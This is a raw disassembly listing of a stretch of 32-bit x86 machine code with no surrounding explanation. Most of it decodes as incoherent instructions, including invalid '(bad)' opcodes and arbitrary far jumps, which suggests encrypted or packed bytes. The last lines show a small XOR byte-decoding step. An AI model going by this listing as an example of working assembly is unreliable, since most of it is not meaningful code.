  423288:	rol    BYTE PTR [esi-0x5c],0x54
  42328c:	sub    ebp,esp
  42328e:	jne    0x423269
  423290:	jmp    0xa3a6:0x8b88ea5f
  423297:	pop    ebx
  423298:	cs addr16 test al,0xd7
  42329c:	cmp    edx,DWORD PTR [ebp+0x45]
  42329f:	xchg   DWORD PTR [ecx+0x30a29cb8],ebp
  4232a5:	add    eax,0xe0faf500
  4232aa:	test   BYTE PTR [edi-0x5e4df2],ch
  4232b0:	mov    ds:0xaa776dd1,al
  4232b5:	mov    bh,0xe9
  4232b7:	ds retf 
  4232b9:	(bad)  
  4232ba:	push   edi
  4232bb:	inc    ebx
  4232bc:	shr    BYTE PTR [esp+edi*4-0x711c8aaa],1
  4232c3:	mov    eax,0x4a94ff2
  4232c8:	adc    ch,BYTE PTR es:[esi+0x5b9e98b4]
  4232cf:	mov    ch,0xbb
  4232d1:	popa   
  4232d2:	xchg   DWORD PTR [ebx+ebp*1-0x23],edx
  4232d6:	mov    al,0xe0
  4232d8:	retf   0x5de
  4232db:	mov    ecx,0xff3863df
  4232e0:	call   0x6c84:0x27bb0800
  4232e7:	(bad)  
  4232e8:	ror    DWORD PTR [ebx-0x73],cl
  4232eb:	cmp    ch,al
  4232ed:	pop    ebp
  4232ee:	push   0x7d
  4232f0:	call   0x5e3f:0x38fb224d
  4232f7:	push   0xa1b0040d
  4232fc:	sbb    BYTE PTR [edi],ch
  4232fe:	sbb    ecx,DWORD PTR [esi+0x3321f942]
  423304:	mov    esp,edi
  423306:	pusha  
  423307:	jnp    0x4232b7
  423309:	xchg   esp,eax
  42330a:	(bad)  
  42330b:	std    
  42330c:	dec    esi
  42330d:	lds    ecx,FWORD PTR [edi+0x1e85eb04]
  423313:	inc    esp
  423314:	nop
  423315:	jbe    0x4232bd
  423317:	ins    BYTE PTR es:[edi],dx
  423318:	adc    eax,0xf84e5d5
  42331d:	push   esi
  42331e:	ret    0x293d
  423321:	sub    DWORD PTR [eax+0x5c806b0],edi
  423327:	and    edx,DWORD PTR [ecx+ebx*8+0x4e]
  42332b:	sub    DWORD PTR [ebx+0x69ee7431],esi
  423331:	cld    
  423332:	imul   eax,DWORD PTR [edx+0x4b6a0026],0xffffffc0
  423339:	sbb    eax,0x7c55c594
  42333e:	mov    al,ds:0xeac59ec4
  423343:	xchg   edx,eax
  423344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423345:	out    dx,eax
  423346:	sub    eax,0x86c79394
  42334b:	ret    
  42334c:	mov    ds:0x2f2dba46,eax
  423352:	or     eax,0x1d84f4be
  423357:	repz jb 0x423366
  42335a:	inc    esp
  42335b:	mov    bh,0x8c
  42335d:	loop   0x423372
  42335f:	xchg   edx,eax
  423360:	or     al,ch
  423362:	enter  0x3c3b,0x7f
  423366:	inc    ebx
  423367:	dec    eax
  423368:	aad    0x37
  42336a:	pop    ebx
  42336b:	xchg   BYTE PTR [edx],dh
  42336d:	mov    ah,0x38
  42336f:	lea    edx,[ebp+0x5a]
  423372:	lods   eax,DWORD PTR ds:[esi]
  423373:	loopne 0x423368
  423375:	mov    dh,0xb2
  423377:	mov    bh,0x82
  423379:	retf   0x918
  42337c:	sbb    DWORD PTR gs:[esi],ecx
  42337f:	imul   DWORD PTR [eax-0x2523eff8]
  423385:	dec    ebx
  423386:	test   al,0x8a
  423388:	mov    ?,WORD PTR ds:0x70fed044
  42338e:	loopne 0x423405
  423390:	push   ebx
  423391:	push   0xffffffcf
  423393:	addr16 aad 0xba
  423396:	pop    eax
  423397:	sbb    eax,DWORD PTR [ebx]
  423399:	fsubr  st(1),st
  42339b:	mov    dh,BYTE PTR [ecx+0x75]
  42339e:	xor    DWORD PTR [eax+0x4326e2a2],edx
  4233a4:	int    0x76
  4233a6:	dec    esi
  4233a7:	stos   DWORD PTR es:[edi],eax
  4233a8:	cwd    
  4233aa:	inc    ebx
  4233ab:	pop    ecx
  4233ac:	cwde   
  4233ad:	sahf   
  4233ae:	fcmovne st,st(1)
  4233b0:	fcom   st(2)
  4233b2:	fs pop esp
  4233b4:	mov    BYTE PTR [ecx],bl
  4233b6:	aaa    
  4233b7:	adc    ebx,DWORD PTR [ebx]
  4233b9:	cmp    cl,BYTE PTR ds:0xebdc7be1
  4233bf:	lea    eax,[ebx]
  4233c1:	adc    DWORD PTR [edx-0x27f3258d],esi
  4233c7:	retf   
  4233c8:	out    dx,al
  4233c9:	jecxz  0x4233c7
  4233cb:	push   ecx
  4233cc:	nop
  4233cd:	jns    0x4233f2
  4233cf:	clc    
  4233d0:	(bad)  
  4233d1:	dec    ebx
  4233d2:	jo     0x42343a
  4233d4:	fwait
  4233d5:	or     dl,bh
  4233d7:	jp     0x42335d
  4233d9:	int    0x7b
  4233db:	xor    ebx,esp
  4233dd:	xor    DWORD PTR [ecx],esp
  4233df:	loope  0x4233dc
  4233e1:	cmc    
  4233e2:	jmp    0x20fc:0x3586310c
  4233e9:	sahf   
  4233ea:	xchg   ebp,eax
  4233eb:	mov    ch,BYTE PTR [esi+0x3c]
  4233ee:	push   ecx
  4233ef:	test   al,0x54
  4233f1:	cmp    DWORD PTR [edi-0x31],esi
  4233f4:	xor    eax,0x3fd14ce7
  4233f9:	mov    eax,0xb96b70c
  4233fe:	and    al,0x74
  423400:	js     0x4233d8
  423402:	test   al,0xeb
  423404:	fxch   st(4)
  423406:	xchg   esi,edi
  423408:	inc    ecx
  423409:	loope  0x4233ef
  42340b:	jne    0x423425
  42340d:	scas   eax,DWORD PTR es:[edi]
  42340e:	pop    edi
  42340f:	rcl    BYTE PTR [ebx-0x25],1
  423412:	xlat   BYTE PTR ds:[ebx]
  423413:	pop    es
  423414:	inc    ebx
  423415:	jmp    0x423458
  423417:	(bad)  
  423418:	jb     0x423408
  42341a:	and    BYTE PTR [edx+0x68],0xa6
  42341e:	dec    ebx
  42341f:	push   eax
  423420:	jle    0x4233c4
  423422:	arpl   si,bx
  423424:	out    0x93,eax
  423426:	stos   DWORD PTR es:[edi],eax
  423427:	pop    edx
  423428:	ins    DWORD PTR es:[edi],dx
  423429:	mov    eax,ds:0xdfad6587
  42342e:	dec    esp
  42342f:	int    0x63
  423431:	xor    bh,BYTE PTR [edi]
  423433:	pop    edx
  423434:	mov    ch,0x76
  423436:	adc    BYTE PTR cs:[edi+0xadd138c],bh
  42343d:	iret   
  42343e:	pop    eax
  42343f:	sbb    BYTE PTR [eax],bh
  423441:	pop    eax
  423442:	test   eax,0x7d3df624
  423447:	scas   al,BYTE PTR es:[edi]
  423448:	ja     0x42342e
  42344a:	cld    
  42344b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42344c:	lods   al,BYTE PTR ds:[esi]
  42344d:	cs jb  0x423472
  423450:	mov    bh,0xef
  423452:	inc    ebp
  423453:	dec    ebp
  423454:	out    dx,al
  423455:	add    BYTE PTR [ebx+0x71],0x12
  423459:	repz pop es
  42345b:	xchg   DWORD PTR [ebx*2+0x1a0faf58],ebx
  423462:	rcl    BYTE PTR [edi+0x57610665],1
  423468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423469:	scas   eax,DWORD PTR es:[edi]
  42346a:	adc    eax,0x9285e17f
  42346f:	scas   al,BYTE PTR es:[edi]
  423470:	and    BYTE PTR [ebx+0x3c],bl
  423473:	jp     0x423499
  423475:	popf   
  423476:	push   esi
  423477:	lds    ecx,FWORD PTR [ecx-0x57658bc8]
  42347d:	fwait
  42347e:	les    ecx,FWORD PTR ds:0x69446fda
  423484:	mov    ds:0x7ea69f84,eax
  423489:	into   
  42348a:	push   ss
  42348b:	mov    WORD PTR [ebp-0x7e],?
  42348e:	out    dx,eax
  42348f:	into   
  423490:	and    eax,0x6c26e707
  423495:	push   edx
  423496:	aas    
  423497:	clc    
  423498:	adc    DWORD PTR [ebx-0x2e],edi
  42349b:	adc    eax,0xeb6986f6
  4234a0:	repnz adc DWORD PTR [edi],ebx
  4234a3:	pop    edx
  4234a4:	push   0xffffffc9
  4234a6:	aad    0x94
  4234a8:	adc    DWORD PTR [edi-0x69438254],0x7af9c823
  4234b2:	sub    DWORD PTR [eax-0xb0e53cf],ecx
  4234b8:	test   eax,0xa77782bd
  4234bd:	jmp    0x42351d
  4234bf:	adc    eax,0xf1ab35cf
  4234c4:	pop    ebp
  4234c5:	xchg   esi,eax
  4234c6:	mul    DWORD PTR [eax+esi*2-0x42]
  4234ca:	mov    WORD PTR [eax-0x80],?
  4234cd:	aad    0xa9
  4234cf:	pop    esp
  4234d0:	sbb    ch,BYTE PTR [ebx]
  4234d2:	bound  esp,QWORD PTR [eax-0x4d]
  4234d5:	mov    edi,0xf0de2d60
  4234da:	mov    al,0xdc
  4234dc:	stos   DWORD PTR es:[edi],eax
  4234dd:	ret    
  4234de:	or     DWORD PTR [edx],esi
  4234e0:	adc    BYTE PTR [esi],ch
  4234e2:	dec    eax
  4234e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234e4:	shr    BYTE PTR ds:0x5101190b,0x34
  4234eb:	push   esp
  4234ec:	retf   0x245c
  4234ef:	sar    DWORD PTR [ebx],1
  4234f1:	xor    al,0x5e
  4234f3:	repz or BYTE PTR [edi+0x4b0e774f],cl
  4234fa:	mov    bl,0x83
  4234fc:	bound  edi,QWORD PTR [esi+0x13]
  4234ff:	in     eax,dx
  423500:	lods   eax,DWORD PTR ds:[esi]
  423501:	int3   
  423502:	add    cl,BYTE PTR [edi+esi*4-0x10]
  423506:	dec    edx
  423507:	cmp    esp,esi
  423509:	js     0x4234ac
  42350b:	xchg   BYTE PTR [ebp+0x1c11d07],ah
  423511:	scas   eax,DWORD PTR es:[edi]
  423512:	idiv   BYTE PTR [esi+0x76880934]
  423518:	pop    es
  423519:	cld    
  42351a:	sbb    bl,al
  42351c:	pop    esp
  42351d:	stos   BYTE PTR es:[edi],al
  42351e:	and    bl,dl
  423520:	cmc    
  423521:	mov    esi,esp
  423523:	and    dh,bl
  423525:	mov    fs,WORD PTR [edx+0x54d6745c]
  42352b:	xor    eax,0x641a5545
  423530:	div    edi
  423532:	mov    ah,0xbe
  423534:	dec    DWORD PTR [ecx+0x6e]
  423537:	je     0x423554
  423539:	ins    DWORD PTR es:[edi],dx
  42353a:	loop   0x423590
  42353c:	mov    ds:0x1d7b0a41,al
  423541:	test   bl,ch
  423543:	push   esp
  423544:	mov    eax,0x5f110af
  423549:	sub    al,0xea
  42354b:	mov    ebx,0x10696357
  423550:	fcom   DWORD PTR [edi+0x5b]
  423553:	mov    esi,esi
  423555:	stc    
  423556:	xor    bh,BYTE PTR [edx]
  423558:	jecxz  0x4235ba
  42355a:	push   ebx
  42355b:	dec    edx
  42355c:	aas    
  42355d:	into   
  42355e:	gs cmp al,0x73
  423561:	push   edx
  423562:	xor    bh,BYTE PTR [ebx]
  423564:	adc    eax,0xa75e4572
  423569:	jo     0x42352f
  42356b:	pop    edi
  42356c:	fld    QWORD PTR [ecx+0x7b]
  42356f:	pop    ss
  423570:	ins    BYTE PTR es:[edi],dx
  423571:	mov    ?,WORD PTR [ecx]
  423573:	xor    eax,0xe944ccc2
  423578:	pushf  
  423579:	xor    esp,DWORD PTR [esi*2+0x6d140916]
  423580:	push   0xffffffd8
  423582:	fcom   QWORD PTR [ecx*4-0xee2c5a2]
  423589:	cwde   
  42358a:	xor    esp,edi
  42358c:	xchg   DWORD PTR [eax+0x3c030f4a],ecx
  423592:	ret    
  423593:	rol    BYTE PTR [edx+0x15],cl
  423596:	push   ebx
  423597:	add    bl,ah
  423599:	mov    al,cl
  42359b:	and    dh,cl
  42359d:	fs mov dl,0xd4
  4235a0:	xchg   BYTE PTR [esi+0x7f],ah
  4235a3:	mov    esi,0x3ff4f373
  4235a8:	push   cs
  4235a9:	mov    bh,0x82
  4235ab:	scas   al,BYTE PTR es:[edi]
  4235ac:	lods   al,BYTE PTR ds:[esi]
  4235ad:	jecxz  0x4235bd
  4235af:	and    ch,BYTE PTR [edx+0x4584fd9d]
  4235b5:	and    esp,edx
  4235b7:	rcl    DWORD PTR [eax+0x3d],cl
  4235ba:	sti    
  4235bb:	test   BYTE PTR [eax+0x3],bl
  4235be:	lahf   
  4235bf:	sub    dh,ch
  4235c1:	test   al,0xe3
  4235c3:	mov    cl,0xe8
  4235c5:	ss int 0x90
  4235c8:	in     al,0x46
  4235ca:	into   
  4235cb:	lods   al,BYTE PTR ds:[esi]
  4235cc:	ret    0xa91f
  4235cf:	and    bh,BYTE PTR [edi-0x709bfa85]
  4235d5:	pop    eax
  4235d6:	retf   0x127a
  4235d9:	adc    dl,BYTE PTR [edi-0x21]
  4235dc:	cwde   
  4235dd:	jae    0x423656
  4235df:	mov    eax,0x331db479
  4235e4:	and    esp,ecx
  4235e6:	dec    ebp
  4235e7:	(bad)  
  4235e8:	ja     0x423609
  4235ea:	shr    DWORD PTR [esi],0xe7
  4235ed:	fdiv   st,st(4)
  4235ef:	or     al,0x9a
  4235f1:	hlt    
  4235f2:	fisub  DWORD PTR [eax-0x1a]
  4235f5:	or     bl,cl
  4235f7:	add    DWORD PTR [esi-0x10],eax
  4235fa:	stos   BYTE PTR es:[edi],al
  4235fb:	and    DWORD PTR [esp+ecx*8+0x20d3157b],0xa5ae337d
  423606:	stos   DWORD PTR es:[edi],eax
  423607:	pop    edi
  423608:	nop
  423609:	les    esp,FWORD PTR [edi]
  42360b:	pop    ebp
  42360c:	pushf  
  42360d:	cmp    eax,0xdcac3cd6
  423612:	inc    esi
  423613:	and    cl,BYTE PTR [ebp+eax*4+0x3a]
  423617:	xchg   edx,eax
  423618:	enter  0x5a8c,0xff
  42361c:	lds    esi,FWORD PTR ds:0xce0d5b1
  423622:	loope  0x42368f
  423624:	fst    st(0)
  423626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423627:	xchg   ecx,eax
  423628:	jnp    0x42361d
  42362a:	jmp    0x423675
  42362c:	sar    BYTE PTR [eax],0x23
  42362f:	sub    eax,0x40ab91e
  423634:	mov    bl,0xed
  423636:	std    
  423637:	pop    es
  423638:	mov    ecx,0x45b1612
  42363d:	cli    
  42363e:	ror    BYTE PTR [ebx-0x7b29f4ba],cl
  423644:	scas   al,BYTE PTR es:[edi]
  423645:	cmp    eax,0x84d49aa6
  42364a:	(bad)  
  42364b:	jno    0x4235d7
  42364d:	mov    DWORD PTR [edi],edi
  42364f:	icebp  
  423650:	xchg   esi,eax
  423651:	pop    eax
  423652:	inc    esp
  423653:	fs inc edx
  423655:	mov    ds:0x6ca56553,al
  42365a:	mov    DWORD PTR [esi+0x6f],ecx
  42365d:	das    
  42365e:	imul   BYTE PTR [ebp+0x2b]
  423661:	add    eax,0x1f49487a
  423666:	fimul  WORD PTR [edx]
  423668:	mov    ah,0xd3
  42366a:	test   al,0x78
  42366c:	ficomp WORD PTR [esi+0xb5092d9]
  423672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423673:	test   ah,dl
  423675:	jecxz  0x42362c
  423677:	call   0xf820e048
  42367c:	sub    edi,DWORD PTR [ecx-0x2e]
  42367f:	pushf  
  423680:	or     ecx,DWORD PTR ds:0xcd7c350b
  423686:	mov    ds:0xad0eccc,al
  42368b:	mov    dl,0x2a
  42368d:	adc    ebx,ecx
  42368f:	push   edx
  423690:	push   0xa68f091a
  423695:	adc    ebp,DWORD PTR es:[ebp+0x1afed84d]
  42369c:	xor    al,0x1c
  42369e:	call   0x9a43:0x5231345f
  4236a5:	push   edx
  4236a6:	or     DWORD PTR [ecx+0x7c],0xc0c8094d
  4236ad:	cmp    al,BYTE PTR [edi-0x748d9f97]
  4236b3:	imul   DWORD PTR [ecx-0x32]
  4236b6:	inc    ecx
  4236b7:	xchg   DWORD PTR [esi],esi
  4236b9:	in     eax,0xb
  4236bb:	fcmovnb st,st(1)
  4236bd:	fst    QWORD PTR [ebp-0x1a]
  4236c0:	jno    0x4236eb
  4236c2:	sbb    ebx,DWORD PTR [eax-0x47e4ea11]
  4236c8:	cmp    esp,DWORD PTR [eax-0xa83f9d]
  4236ce:	iret   
  4236cf:	fs in  al,dx
  4236d1:	xchg   dl,al
  4236d3:	or     al,0x19
  4236d5:	test   DWORD PTR [ebp+0x13948f08],esi
  4236db:	push   es
  4236dc:	ins    BYTE PTR es:[edi],dx
  4236dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236de:	jns    0x423738
  4236e0:	adc    bh,0x7e
  4236e3:	sbb    eax,DWORD PTR [ecx]
  4236e5:	out    0xbc,eax
  4236e7:	adc    eax,0x7ec614f7
  4236ec:	mov    ecx,0xbbdab86
  4236f1:	sti    
  4236f2:	or     ecx,DWORD PTR [edx+0x27]
  4236f5:	push   edi
  4236f6:	push   0xffffffd1
  4236f8:	js     0x423754
  4236fa:	fisub  DWORD PTR [eax-0x73]
  4236fd:	inc    ebp
  4236fe:	mov    bh,ch
  423700:	ins    DWORD PTR es:[edi],dx
  423701:	lds    eax,FWORD PTR [ebp-0x34]
  423704:	imul   ecx,DWORD PTR [ebx-0x1291d3e4],0x7e
  42370b:	das    
  42370c:	xchg   ebp,eax
  42370d:	sbb    DWORD PTR [esi-0x1604705f],eax
  423713:	imul   ebx,DWORD PTR [ebp+0x70],0x996029d3
  42371a:	push   ds
  42371b:	lods   al,BYTE PTR ds:[esi]
  42371c:	loope  0x4236b3
  42371e:	xchg   edi,eax
  42371f:	cmp    BYTE PTR [eax],ah
  423721:	addr16 and al,0x19
  423724:	popf   
  423725:	jle    0x423710
  423727:	enter  0x99ea,0x36
  42372b:	xor    al,0xae
  42372d:	stc    
  42372e:	push   edx
  42372f:	and    al,0x3
  423731:	jbe    0x423710
  423733:	test   al,0x13
  423735:	mov    cl,0x8c
  423737:	fs xor ah,ah
  42373a:	and    eax,0x5a8798b2
  42373f:	dec    ecx
  423740:	popf   
  423741:	dec    edx
  423742:	pop    edi
  423743:	fdivr  QWORD PTR [edx+0x3]
  423746:	ja     0x42374e
  423748:	cmp    al,0x6e
  42374a:	into   
  42374b:	xor    DWORD PTR [ebp+edx*4-0x7c],ecx
  42374f:	mov    al,0xae
  423751:	inc    esp
  423752:	mov    cl,0x57
  423754:	sbb    bh,BYTE PTR [esi+0x10d270f0]
  42375a:	ds or  eax,0xb11d0ae1
  423760:	repz jmp 0x2525:0xf105eed3
  423768:	stos   BYTE PTR es:[edi],al
  423769:	mov    ah,0x62
  42376b:	int3   
  42376c:	inc    ebp
  42376d:	mov    al,BYTE PTR [edi+0x7ce3001d]
  423773:	jnp    0x423718
  423775:	retf   
  423776:	test   DWORD PTR [ebp-0x1e],esp
  423779:	sub    ecx,DWORD PTR [esi+0x2f8f8e37]
  42377f:	cmp    DWORD PTR [ecx-0x8d934d0],ebx
  423785:	push   0x1d
  423787:	je     0x9547a587
  42378d:	aad    0x59
  42378f:	lds    ebp,FWORD PTR [edx-0x72]
  423792:	sar    BYTE PTR [ebx+eax*4-0x64],cl
  423796:	loop   0x42379d
  423798:	jg     0x42376a
  42379a:	daa    
  42379b:	jmp    0xbec0:0xde9cc975
  4237a2:	out    0x84,eax
  4237a4:	push   esi
  4237a5:	mov    dl,0xea
  4237a7:	call   0x6a729b25
  4237ac:	cdq    
  4237ad:	aam    0xef
  4237af:	mov    bl,BYTE PTR [edi-0x54136774]
  4237b5:	push   edi
  4237b6:	or     BYTE PTR [ecx-0x2d56abdc],bh
  4237bc:	inc    edx
  4237bd:	cmp    al,0x91
  4237bf:	gs xor eax,0x58677480
  4237c5:	sub    al,0xd0
  4237c7:	jg     0x423838
  4237c9:	icebp  
  4237ca:	inc    edx
  4237cb:	jmp    0x4237cc
  4237cd:	mov    ?,WORD PTR [ecx+ecx*1+0x21]
  4237d1:	hlt    
  4237d2:	faddp  st(2),st
  4237d4:	and    al,0xae
  4237d6:	repnz adc eax,0xf2b6aa1
  4237dc:	loopne 0x42385b
  4237de:	adc    eax,0xe2a3a557
  4237e3:	out    dx,eax
  4237e4:	add    DWORD PTR [ebx-0x7897c348],ebp
  4237ea:	dec    edx
  4237eb:	push   0x8068e675
  4237f0:	pop    ebp
  4237f1:	pop    edi
  4237f2:	or     al,0x86
  4237f4:	xchg   ebx,eax
  4237f5:	pop    ds
  4237f6:	pop    ss
  4237f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237f8:	jge    0x4237eb
  4237fa:	fs (bad) 
  4237fc:	pushf  
  4237fd:	jae    0x4237e4
  4237ff:	fnsave [ecx]
  423801:	sbb    ch,cl
  423803:	imul   esp,edi,0x63
  423806:	mov    ecx,0xc86f38dc
  42380b:	stos   DWORD PTR es:[edi],eax
  42380c:	or     bl,BYTE PTR [edx-0x3f6ce5f1]
  423812:	(bad)  
  423814:	cmp    DWORD PTR [eax],edi
  423816:	push   ecx
  423817:	mov    BYTE PTR [eax],dl
  423819:	test   WORD PTR [edi-0x154616f4],cx
  423820:	jp     0x423891
  423822:	shr    DWORD PTR ds:0xef577158,1
  423828:	and    BYTE PTR [esi],bh
  42382a:	popf   
  42382b:	xlat   BYTE PTR ds:[ebx]
  42382c:	scas   eax,DWORD PTR es:[edi]
  42382d:	and    DWORD PTR [edi+0x51],ebp
  423830:	and    DWORD PTR [esi],ebx
  423832:	pop    edx
  423833:	and    ebp,DWORD PTR [ecx+0x5cad91b]
  423839:	stc    
  42383a:	mov    esp,?
  42383c:	xchg   esi,eax
  42383d:	push   esp
  42383e:	fdivp  st(0),st
  423840:	addr16 cmp al,0x85
  423843:	xchg   esp,eax
  423844:	jge    0x4238b4
  423846:	outs   dx,BYTE PTR ds:[esi]
  423847:	mov    ebx,0x787b12f4
  42384c:	sbb    DWORD PTR [ecx+0x65],0x13
  423850:	scas   al,BYTE PTR es:[edi]
  423851:	cmp    esi,DWORD PTR [ebp-0x18]
  423854:	inc    edi
  423855:	jl     0x4238a4
  423857:	pop    ebp
  423858:	adc    al,0xcd
  42385a:	mov    esp,0xce3f4487
  42385f:	addr16 clc 
  423861:	nop
  423862:	pusha  
  423863:	push   edi
  423864:	clc    
  423865:	lahf   
  423866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423867:	cmp    esp,DWORD PTR [ecx+ebx*4]
  42386a:	sub    DWORD PTR [eax],edx
  42386c:	popf   
  42386d:	jb     0x42384b
  42386f:	push   ebx
  423870:	push   ss
  423871:	shr    dl,0xd1
  423874:	sbb    dl,bh
  423876:	add    DWORD PTR [ecx-0x7a171b1d],esi
  42387c:	leave  
  42387d:	sub    ah,BYTE PTR [esi-0xa2ca7df]
  423883:	adc    eax,0x5189dd6f
  423888:	xor    al,0x98
  42388a:	frstor [ecx]
  42388c:	and    DWORD PTR [ecx],eax
  42388e:	inc    esp
  42388f:	dec    edi
  423890:	test   al,0x7c
  423892:	shl    DWORD PTR [edi],1
  423894:	push   esi
  423895:	rcl    ebp,1
  423897:	pop    ebp
  423898:	push   es
  423899:	xor    eax,0x4e853bcd
  42389e:	mov    edi,0x63c0b33d
  4238a3:	mov    al,ds:0x5f7175aa
  4238a8:	adc    DWORD PTR [ebx],ecx
  4238aa:	int3   
  4238ab:	hlt    
  4238ac:	int3   
  4238ad:	or     eax,0x3e9a849f
  4238b2:	mov    ebp,DWORD PTR [esi+eax*4+0x4e]
  4238b6:	repnz pop es
  4238b8:	xchg   esp,eax
  4238b9:	mov    WORD PTR [ecx+ebp*2+0xd],gs
  4238bd:	dec    edi
  4238be:	jo     0x42385b
  4238c0:	xlat   BYTE PTR ds:[ebx]
  4238c1:	mov    es:0x98111055,eax
  4238c7:	test   BYTE PTR [ebx+eiz*8+0x6],0xca
  4238cc:	sbb    eax,0xc5bc5342
  4238d1:	icebp  
  4238d2:	xchg   esp,eax
  4238d3:	fld    TBYTE PTR [ecx+ebx*4]
  4238d6:	ja     0x4238d2
  4238d8:	(bad)  
  4238d9:	push   ecx
  4238da:	mov    ss,WORD PTR [ecx-0x51]
  4238dd:	mov    esp,0xc566e3d2
  4238e2:	aas    
  4238e3:	push   ds
  4238e4:	sub    al,0xc9
  4238e6:	arpl   WORD PTR [ecx],sp
  4238e8:	enter  0xff07,0x1b
  4238ec:	gs in  eax,0xc7
  4238ef:	pop    ds
  4238f0:	mov    ecx,?
  4238f2:	add    ebx,DWORD PTR [ebx+0x47]
  4238f5:	sub    DWORD PTR [esi],esi
  4238f7:	pop    ss
  4238f8:	call   0x4db:0xa4bb70bb
  4238ff:	adc    al,0xf2
  423901:	cmp    bl,cl
  423903:	popf   
  423904:	pushf  
  423905:	daa    
  423906:	(bad)  
  423908:	out    0x91,al
  42390a:	pusha  
  42390b:	fxch   st(2)
  42390d:	or     eax,0x3a13a11c
  423912:	icebp  
  423913:	cmc    
  423914:	arpl   sp,si
  423916:	bnd jne 0x4238fc
  423919:	mov    eax,0x9ff8b482
  42391f:	icebp  
  423920:	mov    bh,BYTE PTR [ebx]
  423922:	cmp    BYTE PTR [edi],dl
  423924:	add    DWORD PTR [edi+0x2d3ca004],esi
  42392a:	and    DWORD PTR [eax-0x14],ebp
  42392d:	wbinvd 
  42392f:	fwait
  423930:	dec    ebp
  423931:	dec    esp
  423932:	fisubr DWORD PTR ds:0xc2e181e2
  423938:	jp     0x4238dd
  42393a:	add    eax,0xbe78d09f
  42393f:	sbb    eax,0x703176ce
  423944:	fcmovbe st,st(4)
  423946:	pushf  
  423947:	or     BYTE PTR [esi-0x76e99553],ah
  42394d:	jns    0x4239c8
  42394f:	pushf  
  423950:	jg     0x4238f4
  423952:	push   edi
  423953:	xor    edx,DWORD PTR [edx-0x57b4b39b]
  423959:	add    eax,0x95e7d431
  42395e:	test   cl,ah
  423960:	inc    esp
  423961:	inc    eax
  423962:	jb     0x4239b1
  423964:	mov    al,0xdd
  423966:	mov    ecx,0x7322e463
  42396b:	arpl   WORD PTR [esi],dx
  42396d:	mov    eax,ds:0xf02b7b33
  423972:	mov    al,0x7e
  423974:	sub    eax,0x57ab803a
  423979:	xchg   ecx,eax
  42397a:	or     BYTE PTR [edi+0x21],0x48
  42397e:	loope  0x423906
  423980:	out    dx,al
  423981:	or     DWORD PTR [eax],eax
  423983:	mov    ah,0xc9
  423985:	mov    edx,0x6dc29416
  42398a:	test   al,0x0
  42398c:	mov    BYTE PTR [ecx+eax*1],al
  42398f:	out    dx,eax
  423990:	mov    bl,0xd5
  423992:	push   0xffffffb3
  423994:	mov    eax,0xd6cd5702
  423999:	mov    edx,0xf2517c34
  42399e:	sbb    bh,bh
  4239a0:	cmp    al,BYTE PTR [eax]
  4239a2:	add    edx,esp
  4239a4:	mov    cl,0x2f
  4239a6:	into   
  4239a7:	sub    BYTE PTR [edi-0x8],bh
  4239aa:	jecxz  0x4239ae
  4239ac:	fidiv  WORD PTR [eax-0x76ba65c4]
  4239b2:	xor    BYTE PTR [edx-0x5af100f5],bh
  4239b8:	cmp    DWORD PTR [ecx+0x46],ecx
  4239bb:	inc    eax
  4239bc:	push   0x9e64a170
  4239c1:	inc    eax
  4239c2:	jbe    0x423981
  4239c4:	clc    
  4239c5:	(bad)  
  4239c6:	bound  esi,QWORD PTR [esi+edi*1]
  4239c9:	daa    
  4239ca:	adc    al,0xc
  4239cc:	fbstp  TBYTE PTR [esi+edi*2+0x3b]
  4239d0:	ret    
  4239d1:	inc    ebx
  4239d2:	dec    esi
  4239d3:	adc    ch,dh
  4239d5:	imul   ebp,DWORD PTR [ebx],0x3e
  4239d8:	xchg   ebp,eax
  4239d9:	js     0x4239e8
  4239db:	xor    esi,DWORD PTR [ecx-0x174bbc78]
  4239e1:	push   0x6241621a
  4239e6:	dec    ebx
  4239e7:	xchg   ebx,eax
  4239e8:	or     eax,0xe1db389
  4239ed:	stc    
  4239ee:	xchg   edi,eax
  4239ef:	arpl   WORD PTR [ecx+eiz*4-0x4cd16a06],sp
  4239f6:	cmpxchg DWORD PTR [eax+ecx*1],eax
  4239fa:	imul   ebp
  4239fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239fd:	lds    edi,FWORD PTR [edx+0x2a0c128]
  423a03:	shl    BYTE PTR [edi-0x77],0x68
  423a07:	out    0xf3,eax
  423a09:	scas   al,BYTE PTR es:[edi]
  423a0a:	sbb    BYTE PTR [esi+eax*8+0x4e],bl
  423a0e:	cmp    DWORD PTR [eax+0x7a],eax
  423a11:	inc    ebx
  423a12:	xchg   esp,eax
  423a13:	inc    edi
  423a14:	sahf   
  423a15:	pop    esp
  423a16:	shr    BYTE PTR [ebp-0x44f2baf8],0x7c
  423a1d:	(bad)  
  423a1e:	cli    
  423a1f:	sub    ecx,DWORD PTR [ebp+0x1841d837]
  423a25:	xchg   ebx,eax
  423a26:	jo     0x423a53
  423a28:	mov    WORD PTR [edx],?
  423a2a:	out    0x1d,eax
  423a2c:	daa    
  423a2d:	stos   DWORD PTR es:[edi],eax
  423a2e:	cs jle 0x423a31
  423a31:	repnz cdq 
  423a33:	inc    eax
  423a34:	cmp    edi,DWORD PTR [ecx-0x47]
  423a37:	retf   0x6b21
  423a3a:	je     0x4239ec
  423a3c:	das    
  423a3d:	inc    eax
  423a3e:	aas    
  423a3f:	inc    esp
  423a40:	add    al,0x5
  423a42:	dec    ebx
  423a43:	test   cl,ch
  423a45:	xor    eax,0xd4643b48
  423a4a:	jne    0x4239d7
  423a4c:	push   ebp
  423a4d:	clc    
  423a4e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423a56:	mov    edx,DWORD PTR [ebp-0x54]
  423a59:	xor    edx,esi
  423a5b:	lea    eax,[edx+eax*1+0x3272db]
  423a62:	movzx  edx,BYTE PTR [ebp-0x1]
  423a66:	xor    edx,eax
  423a68:	mov    BYTE PTR [ebp-0x1],dl
  423a6b:	mov    al,BYTE PTR [ebp-0x1]
